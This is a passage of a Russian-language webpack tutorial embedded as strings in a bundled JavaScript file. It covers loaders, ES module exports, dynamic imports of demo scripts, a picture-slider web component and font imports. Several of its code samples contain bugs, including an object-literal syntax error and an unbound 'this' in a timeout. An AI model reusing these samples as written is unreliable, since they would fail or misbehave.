скрипт, который создаст объект **_~module~_** конфигурации ~webpack~\n\n^^^[Модуль path]\n\nДля разрешения конфликтов маршрутов (путей) к файлам \n\nпервым делом в файле кофигурации webpack (~webpack.config.js~) \n\nподключаем встроенный Node.js модуль ~path~:\n\n~~~js\nconst path = require(\'path\')\n~~~\n\nТеперь можно использовать глобальную переменную  **~__dirname~** для получения абсолютного пути к файлу с помощью метода  **~path.resolve~**\n\nНапример, путь к папке  **~build~**, находящейся в корневой папке приложения:\n\n~~~js\npath.resolve(__dirname, \'build\')\n~~~\n\n^^^\n\n_______________________\n\n![ico-20 cap] **Пример 1**\n\n\n◘◘![ico-20 file] webpack.config.js◘◘\n\n~~~js\nconst path = require(\'path\')\n\nmodule.exports = {\n  entry: { main: \'./js/script.js\' },\n  output: {\n    path: path.resolve(__dirname, \'build\'),\n    filename: \'index.js\'\n  }\n}\n~~~\n\n______________________________________________________________\n\n## ![ico-25 webpack] Loaders\n\nПо умолчанию модулем для webpack является js-файл\nДля включения в сборку файлов другого формата нужны специальные загрузчики\nФункция загрузчиков заключается в том, чтобы превратить файл "инородного" происхождения в обычный ES-модуль\nКогда webpack обнаруживает инструкцию импорта файла с расширением, отличным от js, \nон ищет в файле конфигурации ![ico-20 file] webpack.config.js\nсоответствующие правила ( rules ), \nв которых описано, какой загрузчик нужно вызвать для файлов с таким расширением\n\nЕсли такого правила нет, то сборка завершится неудачей\n\n\n**Основные свойства объекта конфигурации Webpack**\n\n| ^^**module.exports**^^ |\n|                | ^^**entry**^^   |               |              | ^^точка входа^^                     |\n|                | ^^**output**^^  |               |              | ^^файл сборки^^                     |\n|                | ^^**module**^^  |               |              | ^^описание&nbsp;модулей^^           |\n|                |                 | ^^**rules**^^ |              | ^^правила^^                         |\n|                |                 |               | ^^**test**^^ | ^^тип файла модулей (/\\.css$/)^^    |\n|                |                 |               | ^^**use**^^  | ^^загрузчик для файлов этого типа^^ |\n\n\n________________________________________________________________\n\n\n### ![ico-20 webpack] Подключение css-модулей\n\n![ico-20 webpack] style-loader\n![ico-20 webpack] css-loader\n\nДля подключения css-файла нужно указать  в файле ![ico-20 file] ~webpack.config.js~\n\n(в объекте конфигурации, в свойстве **~module~**)\n\nправило, по которому будут обрабатываться файлы с расширением  **~css~**\n\nДля этого в свойстве  **~module.rules~** мы определим значение свойства **_~test~_**\n\nс помощью регулярного выражения:  **~/\\.css$/~** ^^(любые файлы с расширением css)^^\n\nа свойство **~module.rules.use~** сделаем массивом, в котором передадим ссылки на загрузчиков:\n\n~~~js\n[\'style-loader\', \'css-loader\']\n~~~\n\n____________________________________________________________________\n\n[%%%**Regular Expressions**%%%](https://developer.mozilla.org/ru/docs/Web/JavaScript/Guide/Regular_Expressions)\n\n________________________________________________________________\n\n## ![ico-25 webpack] Упражнение 5\n\nСоздадим в папке нашего проекта папку ![ico-20 folder] css\n\nПоместим в нее файл ![ico-20 file] main.css\n\n◘◘![ico-20 file] main.css◘◘\n\n~~~css\nbody {\n  background-color: #000;\n  font-family: monospace, Arial;\n  font-size: 16px;\n  color: #9ab;\n}\n~~~\n\n![](https://lh5.googleusercontent.com/oSo7naNlVfS1BFfQ3ybg_bemnZmkDEZKTVrbvxsMjvbCye6wc4DQOO68r1PKQv-MfTtBsdgxep9v98fC6QHu6sGAGx_offjUo-FyNI-3-8RD1iQGMpTAchMMuKpHoZmY2bH5YyIse38gFvk)\n\nДобавим в файл ![ico-20 file] ~script.js~  импорт созданного нами файла стилей:\n\n◘◘![ico-20 file] script.js◘◘\n\n~~~js\nimport css from \'../css/main.css\'\n~~~\n\n![](https://lh6.googleusercontent.com/E60i49827-g4mBJR28bIYMYU2D0NGi7FlnCkYNgkdNVSX4QYCmlAH4nLLJWltIqIns3ymwNfgvOKLJFeFC0ydtEkf6w3SDUgXzUZ5btCJXix4jJZqt4xbLrsRHTsVTDLB7NKtp4lUEktyBs)\n\n__________________________________________________\n\n**Сборка**\n\nА теперь запустим сборку проекта\n\n![ico-20 error] Вебпак выдаст нам ошибку: \n\nон умеет собирать модули js, а вот для загрузки файлов других форматов нужны специальные загрузчики\n\n![](https://lh6.googleusercontent.com/9iIWxB9HHuCzZ4ZFlhrUW_GrG3cCX-Y3560mRCPTICdKPAUGNmWgDpwKFuld9rV8dFnVgHIn7Yv0PophBSGy0AqRouju3FG2Jwc6M2ZVNiWRMvpS0sUX7h08HXTsFs_Pzvtjv73t1aqnex8)\n\nОчевидно, что нужно подключить загрузчики файлов стилей\n\nОднако загрузчики - это пакеты, которые нужно предварительно установить с помощью пакетного менеджера npm\n\n_____________________\n\n### ![ico-20 webpack] Установка загрузчиков\n\n••![ico-20 bash] npm install css-loader style-loader --save-dev••\n\n![](https://lh5.googleusercontent.com/ctLeetPIQ0Bsol7YcR3GC0Qixw4p7xoKnaCivTnevYg86sTwezG9f5vYHAXHGd8Af-M8dVzryfOpC682knlYug_aVafWxnpUxUnpcxmuX1hctX_A1Djj4hNguJYB_ktbmR2SSpTwMW08jAQ)\n\nПосле установки загрузчиков они окажутся в папке ![ico-20 folder] **~node_modules~** проекта\n\n![ico-20 warn] Обратите внимание, что в файле **~package.json~** появилось свойство **_~devDependencies~_**, в котором перечислены установленные нами загрузчики с указанием версии пакета\n\n**package.json**\n\n![](http://icecream.me/uploads/1ecae9d3709876ce3b8cfee212dc4059.png)\n\n__________________________________\n\nТеперь нужно прописать правила, когда вызывать загрузчики\n\n◘◘![ico-20 file] webpack.config.js◘◘\n\n~~~js\nconst path = require(\'path\')\n\nmodule.exports = {\n  entry: { main: \'./js/script.js\' },\n  output: {\n    path: path.resolve(__dirname, \'build\'),\n    filename: \'index.js\'\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.css$/,\n        use: [\n         \'style-loader\',\n         \'css-loader\'\n        ]\n      }\n    ]\n  }\n}\n~~~\n\n_________________________________________________________________________\n\n\n### ![ico-20 webpack] Сборка\n\nТеперь можно запускать сборку проекта\n\n![](https://lh6.googleusercontent.com/LrTASIeOuHlf0WgAZ6hjzzePQ9ib4NLHzddAUco_ufKMrdtR6yhZ1LAAyAymQPUcYaESRPWU7gOovrdR2zKf1XCt6FR3mkUBXUL2XomNqYIUw7bct0o6BTHQUpY3TT92S6KKA9O5heABRLQ)\n\n![ico-20 sandwatch] Вебпак находится в режиме отслеживания наших файлов\n\nТеперь перезагрузите страницу, в которой открыт файл **~index.html~**, и вы увидите, что созданный нами файл стилей подключен\n\nМы можем внести изменения в любой из наших файлов, и эти изменения будут автоматически отображены в файле сборки\n\nДавайте, например, добавим в файл **~main.css~**:\n\n~~~css\nimg { margin: 40px; border: dotted 2px yellow; }\n~~~\n\nперезагрузите страницу, и вы увидите изменения '},94336:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] ES6 модули\n\n[%%%**export**%%%](https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Statements/export)\n[%%%**import**%%%](https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Statements/import)\n\n_______________________________________\n\nМодули - \"строительные блоки\" приложения\n\nСоздаются JS-модули путем экспорта содержимого JS-файла ( ![ico-20 speach] **~export~** )\n\nДиректива ![ico-20 speach] **~import~**  позволяет вставить модуль, созданный с помощью ~export~, в другой JS-файл\n\n^^( при использовании  **webpack**  для сборки приложения поддержка браузерами ES6 модулей не имеет значения - вебпак сделает все правильно ![ico-20 wink] )^^\n\n## ![ico-25 icon] export\n\n_______________________________________________________________\n\n### ![ico-20 icon] Именованный экспорт\n\n**(несколько экспортов из одного файла)**\n\n◘◘![ico-20 file] lib.js◘◘\n\n~~~js\nexport const sqrt = Math.sqrt\n\nexport function buildElement (tagName, container = document.body) {\n  return container.appendChild(document.createElement(tagName)) \n}\n\nexport function elemExist (elemSelector) {\n  return !!document.querySelector(elemSelector)\n}\n~~~\n\n________________________________________________________________\n\n### ![ico-20 icon] Дефолтный экспорт\n\n**Экспорт по умолчанию - это экспорт единственного объекта**\n^^( один \"главный\" объект в модуле )^^\n\n◘◘![ico-20 file] Sample.js◘◘\n\n~~~js\nconst Sample = function (tagName) {\n  this.elem = document.body\n    .appendChild(document.createElement(tagName)) \n}\n\nObject.assign(Sample.prototype, {\n  getAttrs: function () {\n    return Object.getOwnPropertyNames(this.elem)\n  },\n  \n  setAttr: function (attr, val) {\n    this.elem[attr] = val\n  },\n  \n  setStyle = function (css_attr, val) {\n    this.elem.style[css_attr] = val\n  }\n})\n\nexport default Sample\n~~~\n\n____________________________________________________________\n\n## ![ico-25 icon] import\n\nПри импорте из **_js_**-файлов расширение файла указывать не обязательно\n\n### ![ico-20 icon] Импорт именованного экспорта\n \nПредположим, нам нужно использовать функции  **_buildElement_**  и  **_elemExist_**  \nиз файла  **lib.js**  ( см. выше )\nв файле **main.js**\n\n◘◘![ico-20 file] main.js:◘◘\n\n~~~js\nimport { buildElement, elemExist } from 'lib'\n\n// Теперь можно использовать функции **_buildElement_**  и  **_elemExist_**:\n\nconst picture = Object.assign(buildElement('img'), {\n  src: 'http://cs5-2.4pda.to/8853638.gif'\n})\n\nconsole.log(elemExist(picture.tagName))\n~~~\n\n![ico-20 warn] Можно импортировать все содержимое файла lib.js:\n\n◘◘![ico-20 file] main.js:◘◘\n\n~~~js\nimport * as lib from 'lib'\n\n// Тогда вызов функций **_buildElement_**  и  **_elemExist_** будет несколько иным:\n\nvar picture = Object.assign(lib.buildElement('img'), {\n  src: 'http://cs5-2.4pda.to/8853638.gif'\n})\n\nconsole.log(lib.elemExist(picture.tagName))\n~~~\n\n\n\n### ![ico-20 icon] Импорт дефолтного экспорта\n\nТеперь импортируем из файла  **sample.js**  (см. выше) в файл  **main.js**:\n\n~~~js\nimport Sample from 'Sample'\nconst sample = new Sample()\n~~~\n\n__________________________________________________________________________\n\n\n## ![ico-25 hw] Упражнение 2\n\nСоздадим новый файл ![ico-20 file]  **_promise.js_**  в папке ![ico-20 folder]  **src**\n\n◘◘![ico-20 file] promise.js◘◘\n\n~~~js\nvar promise = new Promise(function (resolve, reject) {\n  document.write('Wait, pease...<br>')\n  setTimeout(() => resolve('OK, you are here ?'), 2000)\n})\n\nexport default promise\n~~~\n\n◘◘![ico-20 file] index.js◘◘\n\n~~~js\nimport promise from './promise.js'\n\npromise.then(response => document.querySelector('.sampleClass').innerText += response)\n~~~\n\nв ![ico-20 bash] Git Bush запустим команду ~webpack~\n\n![](https://lh5.googleusercontent.com/zhM1TwRySgAAGrg8ts-n8mvlACifQXHzQudaUs37ce45AtHM9VjMa8CswyohFhG0y9p9sV15jw_rqV8hyOMGX62y5o829hATXLXNLPEN8h779mjS2yC140CdCuwFMvqYGhcu-b9lD1lvquQ)\n\nТеперь откройте файл **_index.html_** в окне браузера\n\n_______________________________________________________\n\n## ![ico-25 icon] Dynamic import \n\n**ES10 ( 2019 )**\n\nДинамический импорт представлен новым синтаксисом вызова **~import()~**, возвращающим промис\n\n^^![ico-20 warn] **~import()~** не является функцией в смысле наследования от **~Function~**, это вообще не объект^^\n\nЗапустите в консоли **Chrome** следующий код:\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\ndocument.body.onclick = async () => {\n  const module = await import('https://garevna.github.io/js-samples/js/index14.js')\n}\n~~~\n\n![ico-20 pin] Примечательно то, что в файле **_index12.js_** нет директивы **_~export~_**\n\nОднако импорт сработал, и скрипт запустился\n\n^^Next demo will show result only once^^\n\n{{{webpack-es-modules-1.js}}}\n\n__________________\n\nВ следующем примере скрипты импортируются динамически, последовательно, с задержкой в несколько секунд\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nconst scriptFile = 'https://garevna.github.io/js-samples/js/index'\n\nimport(`${scriptFile}12.js`)\n  .then(() => setTimeout(() => import(`${scriptFile}21.js`), 10000))\n  .then(() => setTimeout(() => import(`${scriptFile}22.js`), 10000))\n~~~\n\nИспользуем асинхронную функцию для упрощения кода:\n\n◘◘![ico-20 cap] **2(1)**◘◘\n\n~~~js\nconst scriptImports = async moduleFile => {\n  const timeOut = timeInterval => new Promise(resolve => setTimeout(() => resolve(), timeInterval))\n\n  await import(`${moduleFile}12.js`)\n  await timeOut(8000)\n  await import(`${moduleFile}21.js`)\n  await timeOut(12000)\n  await import(`${moduleFile}22.js`)\n}\n\nscriptImports('https://garevna.github.io/js-samples/js/index')\n~~~\n\n____________________________________________\n\nПредположим, в разметке мы подключили скрипт **~index.js~**\n\n\n\n◘◘![ico-20 cap] ** 3** ( index.html )◘◘\n\n~~~html\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n    &lt;meta charset=\"utf-8\">\n    &lt;title>ES Modules&lt;/title>\n&lt;/head>\n\n&lt;body>\n    &lt;script src = \"js/index.js\">&lt;/script>\n&lt;/body>\n\n&lt;/html>\n~~~\n\nКод файла **~index.js~** создает элемент ~&lt;script>~ с атрибутом **~type = \"module\"~** и вставляет его на страницу\n\n~~~js\nconst mod = document.body\n  .appendChild(document.createElement('script'))\nmod.type = 'module'\n~~~\n\nВ элемент ~&lt;script>~ помещается код, который импортирует функцию **_~showMessage~_** из файла _~js/testESModules.js~_\n\nи вызывает ее с текстом \"Hi, students! Welcome to new age of ES Modules!\"\n\n~~~js\nmod.textContent = `\n  import {showMessage} from './js/testESModules.js';\n  showMessage('Hi, students! Welcome to new age of ES Modules!')\n`\n~~~\n\nПолный код:\n\n◘◘![ico-20 cap] ** 3** (js/index.js)◘◘\n\n~~~js\nconst mod = document.body\n  .appendChild(document.createElement('script'))\nmod.type = 'module'\nmod.textContent = `\n  import {showMessage} from './js/testESModules.js'\n  showMessage('Hi, students! Welcome to new age of ES Modules!')\n`\n~~~js\n\nИменованый экспорт в файле _~js/testESModules.js~_\n\n◘◘![ico-20 cap] ** 3** ( js/testESModules.js )◘◘\n\n~~~js\nexport function showMessage (message) {\n  const demo = document.createElement('div')\n  demo.style = `\n    position: fixed;\n    top: 15%; left: 15%;\n    bottom: 15%; right: 15%;\n    box-shadow: 10px 10px 16px #00000090;\n    border: solid 0.5px #bbb;\n    padding: 30px;\n    z-index: 300;\n    background-color: #000;\n  `\n  document.body.appendChild(demo)\n  demo.innerHTML = `\n    <h2 style='color: #789'>Module was successfully imported</h2>\n    <p style='color: #fa0'>Now you can see how it works :)</p>\n    <hr>\n    <p style='color: #dde'>${message}</p>\n  `\n  setTimeout(() => document.body.removeChild(demo), 10000)\n}\n~~~\n\n![ico-20 warn] При импорте модулей следует указывать или полный путь \n\n~~~js\nimport { showMessage } from 'https://example.com/js/testESModules.js'\n~~~\n\nили относительный путь, начинающийся с ~ /~, ~./~ или ~../~\n\n~~~js\nimport { showMessage } from './js/testESModules.js'\n~~~\n\nВ противном случае импорт завершится неудачей\n\n\n[:::Live demo:::](https://garevna.github.io/js-samples/#25)\n"},95885:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-70 webpack] Загрузчики файлов\n\n![ico-20 green-ok] file-loader\n![ico-20 green-ok]  url-loader\n\n## ![ico-20 icon] url-loader\n\nwebpack резолвит любые выражения ~url()~, которые встретит в css-файлах, а также ссылки на изображения из скрипта\n\nwebpack может встраивать ресурсы с помощью загрузчика **~url-loader~**\n\n**~url-loader~** преобразует изображение в код ~base64 URI~\n\nи встраивает в код JavaScript\n\nЭто позволяет сократить количество запросов к серверу, однако приводит к увеличению размеров результирующего файла сборки\n\n**~url-loader~** имеет опцию ~limit~, которая позволяет управлять процессом встраивания файлов изображений в зависимости от их размеров\n\nСвойство ~limit~ загрузчика **~url-loader~** - это максимально допустимый для встраивания размер файла ( в байтах )\n\nТаким образом, небольшие по размеру файлы изображений можно встроить в файл сборки, а для больших создавать копии\n\n![ico-20 warn] При использовании опции ~limit~ необходимо установить как **~url-loader~**, так и **~file-loader~**\n\nВ случае использования опции ~limit~ загрузчик **~url-loader~** передает возможные дополнительные параметры для **~file-loader~**\n\n__________________________________________\n\n## ![ico-25 hw] Упражнение 6\n\n\nСоздадим папку ![ico-20 folder] images в корневой папке нашего проекта и поместим туда несколько файлов изображений:\n\n![](https://lh5.googleusercontent.com/dqODscqbar15EGD-mAhay0YwoS0VzKDKpmUKb3_oYfzyLD-I2JbMNGM_6gBhpWsrr5H9_hLWhIDpwsN_w1UMvE38-ccafSB_FiUrrZ_17b-BiM7cItjm2Ku1WFEix9oWFIXUQ8aiI7mmTDM)\n\nДобавим  в файл ![ico-20 file] **~script.js~** код, который будет добавлять на страницу два элемента ~span~\nс классами  **_git-bush_** и **_git_**\n\nДалее внесем соответствующие изменения в файл ![ico-20 file] **~main.css~**  ( ![ico-20 folder] ~css~ )\n^^( добавим соответствующие классы )^^\n\n◘◘![ico-20 file] script.js◘◘\n\n~~~js\nimport promise from './promise.js'\nimport css from '../css/main.css'\n\npromise.then(response => document.querySelector('.sampleClass').innerText += response)\n\n;['git-bush','git'].forEach(item => document.body.appendChild(document.createElement('span')).className = item)\n~~~\n\n\n◘◘![ico-20 file] main.css◘◘\n\n~~~css\nbody {\n    position: fixed;\n    top: 0;\n    left:0;\n    bottom:0;\n    right:0;\n    background-image: url(../images/columns.gif);\n    background-repeat: no-repeat;\n    background-size: cover;\n    background-position: top center;\n    font-family: monospace, Arial;\n    font-size: 16px;\n    color: #abc;\n}\n.sampleClass {\n    font-size: 25px;\n    font-weight: bold;\n}\n.git-bush, .git {\n    display: inline-block;\n    width: 50px;\n    height: 50px;\n    background-repeat: no-repeat;\n    background-size: contain;\n    background-position: center center;\n}\n\n.git-bush {\n    background-image: url(../images/git-bush.png);\n}\n.git {\n    background-image: url(../images/git.png);\n}\n~~~\n\n_________________________________\n\n### ![ico-20 npm] file-loader\n\nУстановим загрузчик **file-loader**\n\n••![ico-20 bash] npm install --save-dev file-loader••\n\nи внесем необходимые изменения в файл конфигурации\n\n◘◘![ico-20 webpack] webpack.config.js◘◘\n\n~~~js\nconst path = require ( 'path' )\n\nmodule.exports = {\n  entry: { main: './js/script.js' },\n  output: {\n    path: path.resolve ( __dirname, 'build' ),\n    filename: 'index.js'\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.(png&#124;svg&#124;jp?g&#124;gif)$/,\n        use: [\n          {\n            loader: 'file-loader',\n            options: {\n              name: 'images/[name].[ext]'\n            }\n          }\n        ]\n      },\n      {\n        test: /\\.css$/,\n        exclude: /node_modules/,\n        use: [\n          'style-loader',\n          'css-loader'\n        ]\n      },\n    ]\n  }\n}\n~~~\n\n___________________________________\n\n![ico-20 webpack] **Сборка**\n\nОбратите внимание, что после сборки приложения\nвсе файлы изображений, ссылки на которые были в файле ![ico-20 file] **_~main.css~_**,\nоказались в папке ![ico-20 folder] **~images~**,\nкоторая была создана в папке ![ico-20 folder] **~build~**\n\n![](https://lh6.googleusercontent.com/FLcLBZEePLxKPVswXVtkXHofTK2I1wShlFTaWFenTxPXaZRzf1yPSyX8S8mF_sonwERGkos305ZJssSk6Yz04nwPhwK8BVz2jg87eOicg479pjgNiVesfU2x4UH8mOaWJshcN-pZLewfgLI)\n\n_________________________________\n\n![ico-25 cap] встраивание файлов ~.jpg~ и ~.png~ размером менее 25 КБ\n\n~~~js\n{\n  test: /\\.(jpg|png)$/,\n  use: {\n    loader: 'url-loader',\n    options: {\n      limit: 25000\n    }\n  }\n}\n~~~\n\n![ico-20 warn] При передаче параметров загрузчику его не добавляют в свойство ~use~ в виде строки\n\nпотому что теперь это будет объект с двумя свойствами: имя загрузчика и параметры\n\nЕсли файл изображения большой, вместо **~url-loader~** будет использоваться **~file-loader~**, который просто создаст копию файла\n\nИтак, установим **~url-loader~** в папке проекта и внесем изменения в файл конфигурации webpack:\n\n◘◘![ico-25 cap] webpack.config.js◘◘\n\n~~~js\nconst path = require ( 'path' )\n\nmodule.exports = {\n  entry: { main: './js/script.js' },\n  output: {\n    path: path.resolve(__dirname, 'build'),\n    filename: 'index.js'\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.(png&#124;svg&#124;jp?g&#124;gif)$/,\n        use: {\n          loader: 'url-loader',\n          options: {\n            limit: 25000,\n            name: 'images/[name].[ext]'\n          },\n        }\n      },\n      {\n        test: /\\.css$/,\n        exclude: /node_modules/,\n        use: [\n          'style-loader',\n          'css-loader'\n        ]\n      }\n    ]\n  }\n}\n~~~\n\nПрежде, чем запускать сборку, очистим папку ~build/images~, чтобы убедиться, что теперь в нее попадут только большие файлы, а маленькие будут встроены в файл сборки\n\nПосле сборки посмотрим в консоли, как подключены маленькие файлы изображений:\n\n![](https://lh6.googleusercontent.com/H1x8wj8f_gxr6uvn__fH1R2XII_xG7VXN7XzEaqeSAsTUxTpaUkcN2OeA4CuXJfBrl7GC0Z1JDBAfSJNfzVA5FMGXbqGKRvDOslSsBXMxE7tTXIOyd3zh0wFCOhFzLzUgV6hmNwQbqnE5Gc)\n\nФайлы были конвертированы в строку base64 и встроены в сборку\n\n_______________________________________________________________\n\n[%%%file-loader%%%](https://www.npmjs.com/package/file-loader)\n[%%%url-loader%%%](http://docs.w3cub.com/webpack/loaders/url-loader/)\n[%%%loaders%%%](https://webpack.js.org/loaders/)"},94382:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-70 webpack] Именованный экспорт\n\n________________________________\n\n## ![ico-25 hw] Упражнение 7\n\nСоздадим новый файл ![ico-20 file] **_~PictureSlider.js~_**\nв папке ![ico-20 folder] **~js~**\n\n^^Обратите внимание, что в этом файле мы используем **_именованный экспорт_**^^\n^^(два объекта экспортируются из одного файла)^^\n\n![ico-20 green-ok] export class PictureSlider\n![ico-20 green-ok] export const Slide\n\nВ файле ![ico-20 file] **_~PictureSlider.js~_** определим веб-компонент,\nкоторый получает массив входных параметров (ссылки на изображения)\nчерез атрибут **~src~**\n\n◘◘![ico-20 file] PictureSlider.js◘◘\n\n~~~js\nclass PictureSlider extends HTMLElement {\n  constructor () {\n    super()\n\n    Object.assign(this, {\n      pictures: [],\n      container: this.createElem('figure'),\n      currentIndex: 0,\n      currentSlide: 0\n    })\n\n    Object.assign(this, {\n      btnLeft: Object.assign(this.createElem('button', this.container), {\n        id: 'left',\n        innerHTML: '<',\n        onclick: () => this.changePicture('left')\n      }),\n      btnRight: Object.assign(this.createElem('button', this.container), {\n        id: 'right',\n        innerHTML: '>',\n        onclick: () => this.changePicture('right')\n      })\n    })\n\n    this.getData()\n\n    const shadow = this.attachShadow({ mode: 'open' })\n\n    shadow.appendChild(this.container)\n\n    const style = Object.assign(document.createElement('style'), {\n      textContent: this.styles\n    })\n\n    shadow.appendChild(style)\n  }\n\n  createElem (tagName, container) {\n    return (!container ? document.body : container)\n      .appendChild(document.createElement(tagName))\n  }\n\n  async getData () {\n    this.pictures = await new Promise(function (resolve) {\n      setTimeout(() => resolve(this.src), 100)\n    }.bind(this))\n\n    this.slides = [\n      new Slide(this.pictures[0], this.container),\n      new Slide(this.pictures[1], this.container)\n    ]\n\n    this.slides[0].mcFromTo(100, 10)\n    this.slides[1].init(100)\n  }\n  \n  changePicture (direction) {\n    const to = direction === 'left' ? 100 : -100\n\n    const [nextSlide, nextIndex] = [\n      this.currentSlide === 0 ? 1 : 0,\n      this.getNextIndex(direction)\n    ]\n\n    this.slides[nextSlide]\n      .setPicture(this.pictures[nextIndex])\n      .init(-to)\n      .mcFromTo(-to, 10, 1)\n\n    this.slides[this.currentSlide]\n      .mcFromTo(10, to, 0)\n\n    setTimeout(function () {\n      this.currentSlide = nextSlide\n      this.currentIndex = nextIndex\n    }, 1000)\n  }\n\n  getNextIndex (dir) {\n    return dir === 'left'\n      ? this.currentIndex === 0\n        ? this.pictures.length - 1\n        : this.currentIndex - 1\n      : this.currentIndex === this.pictures.length - 1\n        ? 0\n        : this.currentIndex + 1\n    }\n}\n\nconst Slide = function (imageURL, container) {\n  this.imageURL = imageURL\n  const elem = container.appendChild(document.createElement('div'))\n  elem.style = `\n    background-image: url(${imageURL});\n  `\n  this.init = function (left) {\n    Object.assign(elem.style, {\n      left: left + '%',\n      width: container.style.width * 0.8\n    })\n    return this\n  }\n  \n  this.setPicture = pictureURL => {\n    elem.style.backgroundImage = `url(${pictureURL})`\n    return this\n  }\n\n  this.mcFromTo = function (from, to, finalOpacity) {\n    Object.assign(elem.style, {\n      transition: 'none',\n      left: from + '%',\n      width: container.offsetWidth * 0.8 + 'px',\n      opacity: 1 - finalOpacity\n    })\n\n    setTimeout(() => Object.assign(elem.style, {\n      transition: 'all 0.8s',\n      left: to + '%',\n      opacity: finalOpacity\n    }), 50)\n\n    return this\n  }\n}\n\nObject.assign(PictureSlider.prototype, {\n  styles: `\n      figure {\n        position: fixed;\n        top: 10%;\n        left: -10%;\n        bottom: 10%;\n        right: -10%;\n        overflow: hidden;\n      }\n      button {\n        position: absolute;\n        top: 50%;\n        font-size: 30px;\n        z-index: 100;\n        background: transparent;\n        border: 0;\n        color: white;\n        text-shadow: 3px 3px 5px #00000090;\n        outline: none;\n        font-family: monospace;\n      }\n      button:hover {\n        font-size: 32px;\n        text-shadow: 2px 2px 4px #000000b0;\n      }\n      #left { left: 10%; }\n      #right { right: 10%; }\n      div {\n        position: absolute;\n        top: 10%;\n        bottom: 10%;\n        background-repeat: no-repeat;\n        background-size: contain;\n        background-position: center center;\n        transition: all 0.8s;\n      }\n    `\n})\n~~~\n\nИмпортируем ~Slide~ и ~PictureSlider~ в файл **script.js** из файла **PictureSlider.js**\n\n◘◘![ico-20 file] script.js◘◘\n\n~~~js\n'use strict'\n\nimport promise from './promise.js'\nimport { Slide, PictureSlider } from './PictureSlider.js';\nimport css from '../css/main.css';\n\npromise\n  .then(response => Object.assign(document.querySelector('.sampleClass'), { innerText: innerText + response}))\n\n['git-bush','git']\n  .forEach(item => document.body.appendChild(document.createElement('span')).className = item)\n\ncustomElements.define('picture-slider', PictureSlider)\n\nconst slider = document.body.appendChild(document.createElement('picture-slider'))\n\nslider.src = [\n  'https://www.sunhome.ru/i/cards/113/otkritki-valentine-s-day-kartinki.orig.jpg',\n  'http://img.over-blog-kiwi.com/0/98/03/83/20160127/ob_d8f5c9_12163786387fxcdr3.jpg',\n  'https://img.freepik.com/free-photo/painting-mountain-lake-with-mountain-background_188544-9126.jpg',\n  'http://papers.co/wallpaper/papers.co-nx17-sunset-river-lake-beautiful-nature-28-wallpaper.jpg'\n]\n~~~\n"},47403:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-70 webpack] Подключение шрифтов\n\n________________________________\n\n## ![ico-25 hw] Упражнение 8\n\n### ![ico-20 icon] Google Fonts\n\nДля начала импортируем некоторые шрифты [%%%Google%%%](fonts.google.com), используя внешний URL\n\nДля этого в наш файл ![ico-20 file] **~main.css~** мы добавим строчку\n\n~~~css\n@import url("https://fonts.googleapis.com/css?family=Hanalei+Fill|Roboto");\n~~~\n\nТеперь можно использовать эти шрифты ( \'_Hanalei Fill_\', _Roboto_ ) в своих стилях\nУстановим шрифт  \'_Hanalei Fill_\'   для элемента  ~body~\nи шрифт  _Roboto_  для  ~.sampleClass~\n\n______________________________________________________\n\n◘◘![ico-20 file] main.css◘◘\n\n~~~css\n@import url("https://fonts.googleapis.com/css?family=Hanalei+Fill|Roboto:100,300,400");\n\nbody {\n  position: fixed;\n  top: 0;\n  left:0;\n  bottom:0;\n  right:0;\n  background-image: url(../images/columns.gif);\n  background-repeat: no-repeat;\n  background-size: cover;\n  background-position: top center;\n  font-family: monospace, Arial;\n  font-size: 16px;\n  color: #abc;\n  font-family: \'Hanalei Fill\', cursive;\n}\n.sampleClass {\n  font-family: Roboto;\n  font-size: 25px;\n  font-weight: bold;\n}\n.git-bush, .git {\n  display: inline-block;\n  width: 50px;\n  height: 50px;\n  background-repeat: no-repeat;\n  background-size: contain;\n  background-position: center center;\n}\n\n.git-bush {\n  background-image: url(../images/git-bush.png);\n}\n.git {\n  background-image: url(../images/git.png);\n}\n~~~\n\n![ico-20 speach] Если вебпак находится в режиме отслеживания, перезагрузите станицу и вы увидите результат\n\n________________________________________________\n\n### ![ico-20 icon] Font Awesome\n\n[%%%Font Awesome%%%](fontawesome.com)\n\nСамый простой способ подключения иконок Font Awesome - импорт в ![ico-20 file] **~main.css~**:\n\n~~~css\n@import url("https://use.fontawesome.com/releases/v5.2.0/css/all.css");\n~~~\n\nПосле этого можно вставить ![ico-20 file] **~index.html~**, например, такую строчку:\n\n~~~html\n&lt;i class="fas fa-ambulance">&lt;/i>\n~~~\n\nОбновите страницу и вы увидите добавленную иконку\n'},11447:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='## ![ico-25 webpack] Опция --mode\n\nДля того, чтобы настроить различные режимы запуска ~webpack~, нужно использовать опцию **~--mode~**\n\nПосле опции **~--mode~** должно следовать одно из двух возможных значений:\n\n![ico-20 pin] development\n![ico-20 pin] production\n\nПока идет процесс отладки приложения, лучше использовать режим сборки **~development~**, поскольку в консоли можно отслеживать предупреждения о возможных ошибках\n\nВ **~production~** сборке такие предупреждения не будут  выводиться\n\n••![ico-20 bash] webpack --mode development••\n\n![](https://lh3.googleusercontent.com/9Kw0fdiVv9zrVzwLuN9mgI_kTysz4yCDr_pz4DixW9p4EHJnAtuiYC2zjZ_Zua4hZNB9J_7mwNOsVS8BnCpsJs7MmSkxSALp431a-mnwUIog458xNgcAxmUALDz9ddZsAEqqIWRyt9V37Vg)\n\n^^На следующем скрине показаны сообщения о дублировании значений ключей в базе данных, которые позволяют разработчику внести соответствующие изменения перед окончательной сборкой, чтобы избежать проблем в 